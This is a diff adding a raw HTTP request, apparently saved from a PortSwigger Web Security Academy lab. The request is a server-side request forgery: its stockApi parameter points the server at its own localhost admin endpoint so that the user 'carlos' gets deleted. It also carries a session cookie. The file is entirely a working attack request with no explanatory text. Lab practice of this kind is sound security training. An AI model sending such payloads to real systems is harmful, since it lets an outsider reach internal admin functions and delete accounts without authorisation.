@@ -1,0 +1,17 @@
+POST /product/stock HTTP/2
+Host: 0aa2005e03893ab6853ba9c800a600d8.web-security-academy.net
+Cookie: session=Nztr1tV2JZbQbuQfOHIokF5edHiMWlHF
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0aa2005e03893ab6853ba9c800a600d8.web-security-academy.net/product?productId=5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Origin: https://0aa2005e03893ab6853ba9c800a600d8.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+stockApi=http://localhost/admin/delete?username=carlos
